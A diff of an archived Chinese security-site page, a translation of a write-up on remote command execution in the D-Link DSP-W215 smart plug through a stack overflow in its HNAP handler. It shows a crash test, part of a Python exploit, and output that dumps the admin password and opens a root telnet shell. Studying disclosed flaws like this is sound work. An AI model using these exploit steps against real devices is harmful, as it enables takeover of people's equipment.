@@ -3,14 +3,14 @@
 			<head>
 			     <title>D-LinkDSP-W215智能插座远程命令执行 - livers</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/2015">http://drops.wooyun.org/papers/2015</a></h1>
 				
       <p>
-        <h2>0x00 背景</h2>
+        </p><h2>0x00 背景</h2>
 
-<hr />
+<hr>
 
 <p>D-Link DSP-W215 智能插座是一款通过无线控制电源开关的插座。现在还不能从亚马逊和百思买买到，但是固件可以从D-Link网站下载（真蛋疼）。</p>
 
@@ -18,13 +18,13 @@
 
 <h2>0x01 分析</h2>
 
-<hr />
+<hr>
 
 <p>分析插座的固件：</p>
 
 <!--more-->
 
-<p><img src="http://static.wooyun.org/20140918/2014091812481247184.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014091812481247184.png" alt="enter image description here"></p>
 
 <p>Lzma 压缩，linux文件系统，uimage 内核压缩镜像。</p>
 
@@ -32,7 +32,7 @@
 
 <p>HNAP是基于soap 协议，其req/res如下：</p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091812481231820.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014091812481231820.png" alt="enter image description here"></p>
 
 <p>更多查看<a href="http://www.cisco.com/web/partners/downloads/guest/hnap_protocol_whitepaper.pdf">http://www.cisco.com/web/partners/downloads/guest/hnap_protocol_whitepaper.pdf</a></p>
 
@@ -47,17 +47,17 @@ alias.url += ( "/HNAP1/" =&gt; "/www/my_cgi.cgi",
 
 <p>HNAP虽然是需要进行认证的协议，但是某些行为是不需要的，如获取设备信息设置之类。</p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091812481352053.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014091812481352053.png" alt="enter image description here"></p>
 
 <p>HNAP请求数据是由在my_cgi.cgi的do_hnap函数处理。do_hnap会首先处理POST请求中指定的Content-Length头。</p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091812481563599.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014091812481563599.png" alt="enter image description here"></p>
 
 <p>转换长度（str）为int.</p>
 
 <p>然后，它读取上述长度字节的数据放入一个分配了固定大小的栈中。（500,000字节）</p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091812481624130.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014091812481624130.png" alt="enter image description here"></p>
 
 <p>F5转换成c代码为：</p>
 
@@ -89,19 +89,19 @@ perl -e 'print "D"x1000020; print "A"x4' &gt; overflow.txt
 wget --post-file=overflow.txt http://192.168.0.60/HNAP1/
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140918/2014091812481696922.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014091812481696922.png" alt="enter image description here"></p>
 
 <p>Arm寄存器真蛋疼。</p>
 
 <p>由于是getc获取的数据，所以可以传入空字节。作者测试自己my_cgi.cgi进程中执行system地址0x00405CAC需要读入空字节。</p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091812481778093.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014091812481778093.png" alt="enter image description here"></p>
 
 <p>所以 ，只需要把返回地址覆盖成0x00405CAC，并把栈的偏移28位处加入需要执行的指令代码。</p>
 
 <h2>0x02 EXP</h2>
 
-<hr />
+<hr>
 
 <pre><code>#!python
 import sys
@@ -122,7 +122,7 @@ print urllib2.urlopen(req).read()
 <p>执行后得到的数据：</p>
 
 <pre><code>#!bash
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6401120124011201">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ ./exploit.py 'ls -l /'
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6401120124011201">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ ./exploit.py 'ls -l /'
 drwxr-xr-x    2 1000     1000         4096 Jan 14 14:16 bin
 drwxrwxr-x    3 1000     1000         4096 May  9 16:04 dev
 drwxrwxr-x    3 1000     1000         4096 Sep  3  2010 etc
@@ -145,7 +145,7 @@ drwxrwxr-x    8 1000     1000         4096 May  9 16:52 www
 <p>也可以直接dump配置：</p>
 
 <pre><code>#!bash
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1075667550756675">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ ./exploit.py 'nvram show' | grep admin
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1075667550756675">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ ./exploit.py 'nvram show' | grep admin
 admin_user_pwd=200416
 admin_user_tbl=0/admin_user_name/admin_user_pwd/admin_level
 admin_level=1
@@ -156,8 +156,8 @@ storage_user_00=0/admin//
 <p>或通过开启telnet得到一个shell</p>
 
 <pre><code>#!bash
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="acc9dac9ecc9dac9">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ ./exploit.py 'busybox telnetd -l /bin/sh'
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3154475471544754">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ telnet 192.168.0.60
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="acc9dac9ecc9dac9">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ ./exploit.py 'busybox telnetd -l /bin/sh'
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3154475471544754">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ telnet 192.168.0.60
 Trying 192.168.0.60...
 Connected to 192.168.0.60.
 Escape character is '^]'.
@@ -198,7 +198,7 @@ done
 
 <p>D-Link’s DIR-505L也存在这个漏洞。</p>
 
-<p>from:http://www.devttys0.com/2014/05/hacking-the-d-link-dsp-w215-smart-plug/</p>      </p>
+<p>from:http://www.devttys0.com/2014/05/hacking-the-d-link-dsp-w215-smart-plug/</p>      <p></p>
     
 			</body>
 		</html>
